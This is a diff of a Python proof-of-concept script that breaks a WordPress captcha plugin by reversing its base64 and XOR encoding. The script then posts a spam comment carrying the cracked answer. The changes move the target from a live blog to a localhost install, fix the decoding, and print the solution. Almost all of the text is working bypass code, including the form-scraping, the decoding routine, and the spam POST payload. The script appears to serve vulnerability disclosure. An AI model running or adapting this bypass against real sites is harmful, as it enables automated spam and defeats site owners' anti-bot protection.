@@ -48,10 +48,11 @@ import base64
 # enough probabilty for bruting and thus spamming a site :/
 
 # Author: Nikolai Tschacher
-# Date: 06.11.2013
+# Date: 07.11.2013
 
-TARGET = "http://incolumitas.com/2013/10/16/create-your-own-font-the-hard-way/" # The landing site.
-COMMENT_POST = "http://incolumitas.com/wp-comments-post.php" # The comment form to send POST requests at.
+# tested on my local lamp with version 3.8.7
+TARGET = "http://localhost/~nikolai/wordpress/?p=1" # The landing site.
+COMMENT_POST = "http://localhost/~nikolai/wordpress/wp-comments-post.php" # The comment form to send POST requests at.
 KEY = "bws_3110013"
 
 def no_plugin(reason=""):
@@ -85,7 +86,7 @@ def reverse(captcha, key, cptch_time):
         gamma.extend(seq[:8])
     
     decoded = []
-    captcha = base64.b64decode(bytes(captcha, 'ascii'));
+    captcha = base64.b64decode(bytes(captcha, 'utf-8'));
     for c, cc in zip(captcha, gamma):
         decoded.append(chr(c ^ cc))
     return ''.join(decoded[1:])
@@ -93,7 +94,7 @@ def reverse(captcha, key, cptch_time):
 if __name__ == '__main__':
         # Obtain post parameters from comment form
         try:
-                r = requests.get('http://incolumitas.com/2013/10/16/create-your-own-font-the-hard-way/')
+                r = requests.get(TARGET)
         except requests.ConnectionError as cerr:
                 print('Network problem occured: {}'.format(cerr))
         except requests.Timeout as terr:
@@ -133,14 +134,15 @@ if __name__ == '__main__':
         print('[+] Captcha is "{}"'.format(captcha))
         
         # Try to crickiticrack it :P [Well we just use the decode() functon]
-        solution = reverse(captcha, KEY, time)
+        solution = reverse(result, KEY, time)
         
+        print('[+] Found solution: "{}"'.format(solution))
         
         # No write a comment with the cracked captcha to proof that we provided the
         # correct solution.
         payload = {'author': 'spammer', 'email': 'spammer@spamhouse.org', 'url': 'http://spamming.com',
         'cptch_result': result, 'cptch_time': time, 'cptch_number': solution,
-        'comment': "Hi there! No protection from spammers!!!:D", 'submit': 'Post+Comment',
+        'comment': "Hi there! No protection from spammers!!!!:D", 'submit': 'Post+Comment',
         'comment_post_ID': post_id, 'comment_parent': comment_parent}
 
         try:
